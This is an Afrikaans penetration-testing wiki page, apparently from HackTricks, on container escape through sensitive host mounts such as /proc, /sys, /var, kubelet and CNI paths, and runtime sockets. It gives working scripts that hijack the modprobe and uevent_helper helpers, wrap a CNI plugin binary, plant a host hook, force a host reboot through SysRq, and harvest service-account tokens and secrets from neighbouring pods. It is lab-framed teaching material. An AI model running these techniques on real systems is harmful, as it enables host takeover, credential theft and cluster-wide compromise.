# Sensitiewe Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

Host mounts is een van die belangrikste praktiese aanvalsvlakke vir container-escape, omdat hulle dikwels ’n noukeurig geïsoleerde proses-aansig weer direk toegang tot gasheerhulpbronne gee. Die gevaarlike gevalle is nie beperk tot `/` nie. Bind mounts van `/proc`, `/sys`, `/var`, runtime-sockets, kubelet-bestuurde toestand of toestelverwante paaie kan kernelkontroles, geloofsbriewe, lêerstelsels van aangrensende containers en runtime-bestuurskoppelvlakke blootlê.

Hierdie bladsy bestaan apart van die individuele beskermingsbladsye omdat die misbruikmodel verskeie areas oorvleuel. ’n Skryfbare host mount is deels gevaarlik weens mount namespaces, deels weens user namespaces, deels weens AppArmor- of SELinux-dekking, en deels weens die presiese gasheerpad wat blootgestel is. Deur dit as ’n eie onderwerp te behandel, word die aanvalsvlak baie makliker om te verstaan.

Vergelyk ook ’n skryfbare gasheergids met die ooreenstemmende pad binne elke container. As dit bo-oor ’n gids met uitvoerbare opstartscripts gemount is, kan ’n gasheergebruiker met laer regte moontlik kode plaas wat ’n container-entrypoint met hoër regte laai wanneer dit die volgende keer herbegin. Bevestig die presiese bind-bron en -bestemming, die gids se skryf- en soektoestemmings, die entrypoint-lus en die vereiste dat die lêer uitvoerbaar is, die runtime-UID en ’n werklike herbegin-sneller. Container UID 0 is nie outomaties gasheer-UID 0 nie; user-namespace-kartering en mount-beleid bepaal die uitwerking op die gasheer. Passiewe hersiening moet paaie en toestemmings rapporteer sonder om ’n script te skryf of die werklas te herbegin.

’n Linux-container kan binne ’n bestuurs-VM wees wat ’n deel van ’n afsonderlike Windows-gasheer se lêerstelsel deel. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) is een manier waarop gasheerlêers in ’n gas ontstaan sigbaar word, maar root in daardie VM is steeds ’n ander identiteit as ’n Windows-administrateur. As die gedeelde vouer ’n gebruiker se leesbare SSH-private sleutel blootlê, behandel dit as ’n leidraad vir ’n geloofsbrief: bevestig die presiese gasheergesteunde mount, sleuteleienaarskap en -toegang, die ooreenstemmende rekening en die Windows SSH-bediener se **effektiewe** beleid vir gemagtigde sleutels voordat jy aflei dat dit ’n gasheeraanmelding toelaat. Moderne [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) gebruik dikwels ’n aparte `administrators_authorized_keys`-lêer vir administrateurrekeninge. Hou die inhoud van private sleutels uit gewone enumerasie-uitvoer; mount- en sleutelpadmetadata is voldoende vir passiewe triage.

## `/proc`-blootstelling

procfs bevat sowel gewone prosesinligting as kernelbeheer-koppelvlakke met groot impak. ’n Bind mount soos `-v /proc:/host/proc` of ’n containeraansig wat onverwagte skryfbare proc-inskrywings blootlê, kan dus lei tot inligtingslekkasie, diensweiering of direkte kode-uitvoering op die gasheer.

Hoëwaarde procfs-paaie sluit in:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (veral `register` en `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Misbruik

Begin deur te kontroleer watter hoëwaarde procfs-inskrywings sigbaar of skryfbaar is:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Hierdie paaie is om verskillende redes interessant. `core_pattern`, `modprobe` en `binfmt_misc` kan paaie vir kode-uitvoering op die gasheer word wanneer hulle skryfbaar is. `kallsyms`, `kmsg`, `kcore` en `config.gz` is kragtige bronne vir verkenning tydens kernel-exploitation. `sched_debug` en `mountinfo` onthul proses-, cgroup- en lêerstelselkonteks wat kan help om die gasheer se uitleg vanuit die container te rekonstrueer.

Die praktiese waarde van elke pad verskil, en om hulle almal te behandel asof hulle dieselfde impak het, maak triage moeiliker:

- `/proc/sys/kernel/core_pattern`
  As dit skryfbaar is, is dit een van die procfs-paaie met die grootste impak, omdat die kernel ’n pipe-handler uitvoer ná ’n crash. ’n Container wat `core_pattern` kan laat wys na ’n payload wat in sy overlay of in ’n gemounte gasheerpad gestoor is, kan dikwels kode-uitvoering op die gasheer verkry. Sien ook [read-only-paths.md](protections/read-only-paths.md) vir ’n toegewyde voorbeeld.
- `/proc/sys/kernel/modprobe`
  Hierdie pad beheer die userspace-helper wat die kernel gebruik wanneer dit module-laailogika moet aanroep. As dit vanuit die container skryfbaar is en in die gasheerkonteks geïnterpreteer word, kan dit nog ’n primitief vir kode-uitvoering op die gasheer word. Dit is veral interessant wanneer dit gekombineer word met ’n manier om die helper-pad te aktiveer.
- `/proc/sys/vm/panic_on_oom`
  Dit is gewoonlik nie ’n eenvoudige ontsnappingsprimitief nie, maar kan geheuedruk omskep in ’n diensweiering wat die hele gasheer raak deur OOM-toestande in kernel-panic-gedrag te verander.
- `/proc/sys/fs/binfmt_misc`
  As die registrasie-koppelvlak skryfbaar is, kan die aanvaller ’n handler vir ’n gekose magic value registreer en uitvoering in die gasheerkonteks verkry wanneer ’n ooreenstemmende lêer uitgevoer word.
- `/proc/config.gz`
  Nuttig vir triage van kernel-exploits. Dit help bepaal watter substelsels, versagtings en opsionele kernelfunksies geaktiveer is, sonder dat gasheer-pakketmetadata nodig is.
- `/proc/sysrq-trigger`
  Hoofsaaklik ’n diensweieringspad, maar ’n baie ernstige een. Dit kan die gasheer onmiddellik herbegin, laat panikeer of andersins ontwrig.
- `/proc/kmsg`
  Onthul boodskappe uit die kernel-ringbuffer. Nuttig vir gasheer-fingerprinting, crash-analise en, in sommige omgewings, vir die lek van inligting wat nuttig is vir kernel-exploitation.
- `/proc/kallsyms`
  Waardevol wanneer dit leesbaar is, omdat dit inligting oor uitgevoerde kernelsimbole blootlê en kan help om aannames oor adresrandomisering tydens kernel-exploit-ontwikkeling te ondermyn.
- `/proc/[pid]/mem`
  Dit is ’n direkte koppelvlak na prosesgeheue. As die teikenproses met die nodige ptrace-agtige voorwaardes bereikbaar is, kan dit die lees of wysiging van ’n ander proses se geheue moontlik maak. Die realistiese impak hang sterk af van geloofsbriewe, `hidepid`, Yama en ptrace-beperkings; dit is dus ’n kragtige maar voorwaardelike pad.
- `/proc/kcore`
  Bied ’n kernbeeld-agtige aansig van stelselgeheue. Die lêer is enorm en lomp om te gebruik, maar as dit betekenisvol leesbaar is, dui dit op ’n swak beskermde gasheergeheue-oppervlak.
- `/dev/kmem` en `/dev/mem`
  Dit is historiese rougeheue-**toestel**-koppelvlakke met ’n groot impak, nie procfs-lêers nie. Op baie moderne stelsels is hulle afwesig of streng beperk, maar ’n container wat ’n gemounte gasheerkopie kan oopmaak, moet die blootstelling as kritiek beskou. Beoordeel hulle saam met ander sensitiewe `/dev`-mounts eerder as om na die niebestaande `/proc/kmem`- of `/proc/mem`-paaie te soek.
- `/proc/sched_debug`
  Lek skedulerings- en taak-inligting wat gasheerproses-identiteite kan blootlê, selfs wanneer ander proses-aansigte skoner lyk as wat verwag is.
- `/proc/[pid]/mountinfo`
  Uiters nuttig om te rekonstrueer waar die container werklik op die gasheer geleë is, watter paaie deur overlay gerugsteun word, en of ’n skryfbare mount met gasheerinhoud ooreenstem of net met die container-laag.

As `/proc/[pid]/mountinfo` of overlay-besonderhede leesbaar is, gebruik dit om die gasheerpad van die container-lêerstelsel te vind:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Hierdie opdragte is nuttig omdat ’n aantal host-uitvoeringstruuks vereis dat ’n pad binne die container omgeskakel word na die ooreenstemmende pad vanuit die host se perspektief.

### Voorbeeld: Voorbereiding Van ’n `modprobe`-hulppad

As `/proc/sys/kernel/modprobe` skryfbaar is vanuit die container en die hulppad in die host-konteks geïnterpreteer word, kan dit na ’n aanvallerbeheerde payload herlei word. Die overlay upper-gids moet vanaf die host opgelos word, en bewysuitvoer moet teruggeskryf word na dieselfde host-sigbare container-laag as die container nie ook die host se `/tmp` mount nie:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Die presiese trigger hang af van die teiken en kernel se gedrag, en word doelbewus nie geraai nie. Herstel die oorspronklike waarde voordat jy die lab verlaat. Die belangrike punt is dat ’n skryfbare helper-pad ’n toekomstige kernel-helper-aanroep kan herlei na aanvallerbeheerde inhoud op die host-pad. ’n Ontbrekende overlay-`upperdir`, ’n pad wat die host nie kan oplos nie, ’n leesalleen-sysctl-mount, of ’n kernel wat nooit die gekose helper aanroep nie, breek hierdie ketting.

### Volledige Voorbeeld: Kernel Recon Met `kallsyms`, `kmsg` En `config.gz`

As die doel ’n beoordeling van uitbuitbaarheid is eerder as onmiddellike escape:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Hierdie opdragte help om vas te stel of nuttige simboolinligting sigbaar is, of onlangse kernel-boodskappe interessante toestand onthul, en watter kernelfunksies of -versagtings ingekompileer is. Die impak is gewoonlik nie ’n direkte escape nie, maar dit kan die triage van kernelkwesbaarhede aansienlik verkort.

### Volledige voorbeeld: SysRq-herlaai van die host

As `/proc/sysrq-trigger` skryfbaar is en toegang tot die host-aansig het:

```bash
echo b > /proc/sysrq-trigger
```

Die gevolg is dat die gasheer onmiddellik herlaai. Dit is nie ’n subtiele voorbeeld nie, maar dit wys duidelik dat blootstelling van procfs baie ernstiger kan wees as bloot inligtingopenbaarmaking.

## `/sys`-blootstelling

sysfs stel groot hoeveelhede kern- en toesteltoestand bloot. Sommige sysfs-paaie is hoofsaaklik nuttig vir vingerafdrukvorming, terwyl ander die uitvoering van helpers, toestelgedrag, sekuriteitsmodulekonfigurasie of firmwaretoestand kan beïnvloed.

Sysfs-paaie met ’n hoë waarde sluit in:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Hierdie paaie is om verskillende redes belangrik. `/sys/class/thermal` kan termiese bestuursgedrag beïnvloed en dus die stabiliteit van die gasheer in swak beskermde omgewings in gevaar stel. `/sys/kernel/vmcoreinfo` kan inligting oor ongelukstortings en kernuitleg uitlek, wat help met laevlak-vingerafdrukvorming van die gasheer. `/sys/kernel/security` is die `securityfs`-koppelvlak wat deur Linux Security Modules gebruik word, dus kan onverwagte toegang daar MAC-verwante toestand blootstel of verander. EFI-veranderlike paaie kan fermware-ondersteunde selflaai-instellings beïnvloed, wat hulle baie ernstiger maak as gewone konfigurasielêers. `debugfs` onder `/sys/kernel/debug` is besonder gevaarlik omdat dit doelbewus ’n koppelvlak vir ontwikkelaars is, met veel minder veiligheidsverwagtinge as geharde kern-API’s wat vir produksie bedoel is.

Elke sysfs-inskrywing op hierdie lys is **afhanklik van die kern, konfigurasie en hardeware**. Huidige gevirtualiseerde nodusse laat dikwels `uevent_helper`, EFI-veranderlikes en termiese toestelinskrywings heeltemal weg. Teken ’n ontbrekende pad as ’n negatiewe voorvereiste aan, eerder as om aan te neem dat ’n voorbeeld van ’n ander kern van toepassing is.

Nuttige hersieningsopdragte vir hierdie paaie is:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Wat daardie opdragte interessant maak:

- `/sys/kernel/security` kan verklap of AppArmor, SELinux of ’n ander LSM-oppervlak sigbaar is op ’n manier wat net op die gasheer moes gebly het.
- `/sys/kernel/debug` is dikwels die kommerwekkendste bevinding in hierdie groep. As `debugfs` gemonteer en leesbaar of skryfbaar is, moet jy ’n uitgebreide kern-gerigte oppervlak verwag waarvan die presiese risiko afhang van die geaktiveerde ontfoutingsnodes.
- Blootstelling van EFI-veranderlikes kom minder algemeen voor, maar het ’n groot impak as dit voorkom, omdat dit firmware-gesteunde instellings raak eerder as gewone looptydlêers.
- `/sys/class/thermal` is hoofsaaklik relevant vir gasheerstabiliteit en hardeware-interaksie, nie vir ’n netjiese ontsnapping in dopstyl nie.
- `/sys/kernel/vmcoreinfo` is hoofsaaklik ’n bron vir gasheer-vingerafdrukke en omvalontleding, nuttig om laevlak-kernstatus te verstaan.

### Volledige voorbeeld: `uevent_helper`

`/sys/kernel/uevent_helper` is afhanklik van die kern en konfigurasie en ontbreek op baie huidige stelsels. As dit bestaan, skryfbaar is en ’n bruikbare `uevent`-sneller beskikbaar is, kan die kern ’n aanvaller-beheerde helper uitvoer. Bewysuitset moet ’n pad gebruik wat vanuit beide die gasheer- en houeraansigte sigbaar is:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Die rede waarom dit werk, is dat die helper-pad vanuit die gasheer se perspektief geïnterpreteer word. Sodra dit geaktiveer is, loop die helper in die gasheerkonteks eerder as binne die huidige container. `/sys/class/mem/null/uevent` is een konkrete sneller op kernels wat dit blootstel; ander toestelle kan hul eie `uevent`-lêers blootstel, maar moenie sommer een op regte hardeware kies nie. Herstel die oorspronklike waarde voordat jy die lab verlaat. Moenie hierdie tegniek as beskikbaar rapporteer wanneer die helper-lêer of ’n beheerde sneller ontbreek nie.

## Blootstelling van `/var`

Om die gasheer se `/var` in ’n container te mount, word dikwels onderskat omdat dit nie so dramaties lyk soos om `/` te mount nie. In die praktyk kan dit genoeg wees om toegang te kry tot runtime-sockets, container-snapshot-gidse, kubelet-bestuurde pod-volumes, geprojekteerde diensrekeningtokens en lêerstelsels van nabygeleë toepassings. Op moderne nodusse is `/var` dikwels waar die mees operasioneel interessante container-toestand werklik voorkom.

### Kubernetes-voorbeeld

’n Pod met `hostPath: /var` kan dikwels ander pods se geprojekteerde tokens en overlay-snapshot-inhoud lees:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Hierdie opdragte is nuttig omdat hulle wys of die mount slegs oninteressante toepassingsdata blootstel, of hoë-impak clusterbewyse. ’n Leesbare diensrekeningtoken kan plaaslike kode-uitvoering onmiddellik in toegang tot die Kubernetes API omskep.

As die token teenwoordig is, valideer waartoe dit toegang het, eerder as om by die ontdekking van die token te stop:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Die impak hier kan veel groter wees as plaaslike node-toegang. ’n Token met breë RBAC kan ’n gemounte `/var` in ’n clusterwye kompromittering omskep.

### Docker- en containerd-voorbeeld

Op Docker-hosts is die relevante data dikwels onder `/var/lib/docker`, terwyl dit op Kubernetes-nodes wat deur containerd aangedryf word, onder `/var/lib/containerd` of snapshotter-spesifieke paaie kan wees:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

As die gemonteerde `/var` skryfbare snapshot-inhoud van ’n ander werklading blootstel, kan die aanvaller moontlik toepassingslêers verander, webinhoud byvoeg of opstartscripte wysig sonder om die huidige container-konfigurasie aan te raak.

Op ’n **weggooibare laboratoriumwerklading** kan skryfbare snapshot-inhoud gebruik word om toepassingspeutering, geheimeherwinning of lateral movement te demonstreer. Koppel eers die runtime-container-ID aan die presiese snapshot en wysig nooit ’n onverwante of produksie-snapshot nie:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Hierdie opdragte is nuttig omdat hulle die drie hoofimpakgroepe van ’n gemounte `/var` toon: peuterwerk met toepassings, herwinning van geheime en laterale beweging na naburige workloads.

Direkte skrywe na snapshots omseil die runtime se normale toestandsbestuur en kan die container beskadig of bewyse vernietig. Leesalleen-ontdekking is plaaslik teen Docker `overlay2` herhaal: ’n merker wat in ’n naburige weggooibare container geskryf is, het onder `/var/lib/docker/overlay2/<id>/diff/` verskyn. Beperk werklike snapshot-wysigings tot ’n weggooibare container wat vir daardie toets geskep is.

## Kubelet-toestand, plugins en CNI-paaie

’n Mount van `/var/lib/kubelet`, `/opt/cni/bin` of `/etc/cni/net.d` word dikwels via bevoorregte DaemonSets, CNI-agente, CSI-nodusplugins, GPU-operateurs en stoorshulpmiddels blootgestel. Hierdie mounts is maklik om as "nodusloodgieterswerk" af te maak, maar hulle lê direk in die uitvoeringspad vir nuwe pods en bevat dikwels kubelet-bewyse, geprojekteerde geheime, registrasiesockets en uitvoerbare plugins se binaries aan die gasheerkant.

Teikens met hoë waarde sluit in:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Nuttige hersieningsopdragte is:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Waarom hierdie paaie belangrik is:

- `/var/lib/kubelet/pki` kan kubelet-kliëntsertifikate en ander node-local geloofsbriewe blootlê wat soms teen die API-server of kubelet-gerigte TLS-eindpunte hergebruik kan word, afhangend van die cluster-ontwerp.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` bevat dikwels geprojekteerde service-account-tokens en gemounte Secrets vir naburige pods op dieselfde node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is hoofsaaklik ’n reconnaissance-oppervlak, maar ’n baie nuttige een: dit wys watter pods en containers tans GPU’s, hugepages, SR-IOV-toestelle en ander skaars node-local hulpbronne gebruik.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` en `/var/lib/kubelet/plugins_registry` wys watter CSI-, DRA- en device-plugins geïnstalleer is en met watter sockets die kubelet verwag word om te kommunikeer. As daardie gidse skryfbaar is, eerder as net leesbaar, is die bevinding baie ernstiger.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` en `/etc/cni/net.d` is direk deel van die pod-netwerkopstellingspad. Skryftoegang daar is dikwels ’n vertraagde host-execution-primitief eerder as net blootstelling van konfigurasie.<sup>[[2]](#references)</sup>

### Volledige voorbeeld: Skryfbare `/opt/cni/bin`

As ’n host CNI-binêregids lees-skryf gemount is, kan die vervanging van ’n plugin genoeg wees om host-uitvoering te verkry wanneer die kubelet volgende ’n pod-sandbox op daardie node skep:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Dit is nie so onmiddellik soos ’n gemonteerde `docker.sock` nie, maar kom dikwels meer realisties voor in gekompromitteerde Kubernetes-infrastruktuur-Pods. Die merker word langs die gemonteerde plugin geskryf sodat die container dit kan ophaal, selfs sonder ’n host-root- of host-`/tmp`-montering. Die wrapper behou die oorspronklike argumente en standaardinvoer, waarna die voorbeeld die oorspronklike binary herstel. Die belangrike punt is dat die gewysigde binary later deur die host se netwerkopstellingsvloei uitgevoer word, nie deur die huidige container nie. Gebruik slegs ’n weggooiknooppunt, want ’n ongeldige wrapper kan veroorsaak dat nuwe Pod-sandboxes nie netwerktoegang kry nie.

## Runtime-sokke

Sensitiewe host-montering sluit dikwels runtime-sokke in eerder as volledige gidse. Hulle is so belangrik dat dit die moeite werd is om hulle hier uitdruklik te herhaal:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Sien [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) vir volledige exploitation flows sodra een van hierdie sockets gemount is.

As ’n vinnige eerste interaksiepatroon:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

As een hiervan slaag, is die pad van ’n "gemounte socket" na die begin van ’n meer bevoorregte sibling-container gewoonlik baie korter as enige kernel-breakout-pad.

Dieselfde daemon-toegang kan ook **volharding op die gasheer** bewerkstellig. ’n Hulpcontainer met ’n skryfbare bind mount van die gasheerwortel kan lêers deur `docker cp` ontvang en dan `docker exec` gebruik om ’n SSH-sleutel, diens-eenheid of ander volhardingslêer onder die gemounte gasheerpad te plaas. Die sekuriteitsgrens is die daemon se bevoegdheid om die gasheermount te skep; `docker cp` is slegs ’n tussenstap. Oudit sowel nuutgeskepte containers as skryfbewerkings na gasheerverifikasie- of opstartpaaie nadat ’n runtime-socket blootgestel is.

## Taakkaping via skryfbare gasheerpad

’n Skryfbare gasheermount hoef nie `/` bloot te stel om gevaarlik te wees nie. As die gemounte pad skrifte, konfigurasielêers, hooks, plugins of lêers bevat wat later deur ’n geskeduleerde taak of diens aan die gasheerkant gebruik word, kan die container dalk verander wat die gasheer uitvoer.

Algemene hersieningsvloei:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

As ’n skryfbare lêer deur ’n gasheerproses gebruik word, hou die payload eenvoudig en waarneembaar tydens toetsing:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

Die interessante deel is die vertrouensgrens: die skryfaksie vind binne die container plaas, maar uitvoering gebeur later in die host-diens se konteks. Dit verander ’n beperkte hostPath of bind mount in ’n primitief vir vertraagde kode-uitvoering op die host.

## Root-besitte lêers op ’n gedeelde host-pad

’n Container-rekening wat root kan word, kan moontlik ’n root-besitte lêer op ’n skryfbare pad plaas wat ook deur die host gebruik word. As container-UID 0 na host-UID 0 karteer, verwys albei aansigte na dieselfde lêer, en die host mount SUID-uitvoering toelaat, kan ’n hostgebruiker wat ’n root-besitte SUID-uitvoerbare lêer op daardie pad kan laat loop, die host se voorreggrens oorsteek. Die container hoef nie met `--privileged` te loop vir hierdie spesifieke lêereienaarskapskwessie nie. Sien [user namespace mappings](protections/namespaces/user-namespace.md) en die [SUID-bespreking](privileged-containers.md) vir die afsonderlike voorwaardes.

Gaan die pad na **albei kante** van die grens na: vergelyk ’n onskadelike lêer se eienaarskap en identiteit, kontroleer die container se `uid_map` en `gid_map`, en ondersoek die host se mount-opsies en uitvoeringsbeleid. `rw` aan die container-kant sonder `nosuid` is net ’n moontlike kandidaat; dit bewys nie host-eienaarskap, host-mountvlae, toegang vir ’n hostgebruiker of dat AppArmor/SELinux uitvoering toelaat nie. `noexec` beperk uitvoering in die aansig waar dit geld. Die `shared:`- en `master:`-merkers in `/proc/self/mountinfo` beskryf mount-propagasie, nie of die lêerinhoud met die host gedeel word nie. ’n Bind mount kan sonder dié merkers wees. Hergebruik van aanmeldbewyse wat ’n host-aanmelding moontlik maak, is ’n afsonderlike stap van die voorreggrens wat deur die gedeelde lêer geskep word.

Die host se runtime-berging kan ’n soortgelyke pad skep, selfs sonder ’n eksplisiete bind mount. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) het ’n onbevoorregte hostgebruiker toegelaat om deur Docker-data-subgidse te navigeer en lêers uit ’n container-lêerstelsel uit te voer; Moby het die toestemmings in 20.10.9 reggestel en meld dat lopende containers herbegin moet word om hul gidse reg te stel. Ondersoek die presiese gemounte `overlay2/<id>/merged`-paaie en elke ouergids se soektoestemming, en bepaal dan of container-UID 0 na host-UID 0 karteer, of ’n werklike root-besitte SetUID-uitvoerbare lêer teenwoordig en bereikbaar is, en of die host-aansig SetUID-uitvoering toelaat. Rootless- of user-namespace-remapped containers, `nosuid`, `noexec`, `no_new_privs` en MAC-beleid kan die resultaat verander. ’n Runtime-weergawe of navigeerbare pad alleen is ’n leidraad vir ondersoek, nie bewys van uitvoering as host-root nie; ondersoek mount- en lêermetadata sonder om ’n kandidaat-uitvoerbare lêer te laat loop.

## CVE’s wat met mounts verband hou

Host mounts kan ook met runtime-kwesbaarhede oorvleuel. Belangrike onlangse voorbeelde sluit in:

- `CVE-2024-21626` in `runc`, waar ’n gelekde gids-lêerbeskrywer die werkgids op die host-lêerstelsel kon plaas.
- `CVE-2024-23651`, `CVE-2024-23652` en `CVE-2024-23653` in BuildKit, waar kwaadwillige Dockerfiles, frontends en `RUN --mount`-vloeie tydens bouwerk weer toegang tot host-lêers, uitvee of verhoogde voorregte kon moontlik maak.
- `CVE-2024-1753` in Buildah- en Podman-bouvloeie, waar spesiaal vervaardigde bind mounts tydens bouwerk `/` met lees-skryf-toegang kon blootstel.
- `CVE-2025-47290` in `containerd` 2.1.0, waar ’n TOCTOU tydens die uitpak van ’n image ’n spesiaal vervaardigde image kon toelaat om die host-lêerstelsel tydens aflaai te wysig.

Hierdie CVE’s is hier ter sake omdat hulle wys dat mount-hantering nie net oor operateurkonfigurasie gaan nie. Die runtime self kan ook ontsnappingsvoorwaardes skep wat deur mounts veroorsaak word.

## Kontroles

Gebruik hierdie opdragte om die mount-blootstellings met die grootste potensiële impak vinnig op te spoor:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Wat is hier interessant:

- Host-root, `/proc`, `/sys`, `/var` en runtime-sokke is almal bevindings met hoë prioriteit.
- Skryfbare proc-/sys-inskrywings beteken dikwels dat die mount host-wye kernelkontroles blootstel eerder as ’n veilige container-aansig.
- Gemonteerde `/var`-paaie verdien ’n ondersoek na credentials en naburige workloads, nie net ’n lêerstelselondersoek nie.
- Kubelet-statusgidse en CNI-/inproppaaie verdien dieselfde prioriteit as runtime-sokke, omdat hulle dikwels direk op die node se pad vir die skep van pods en verspreiding van credentials lê.

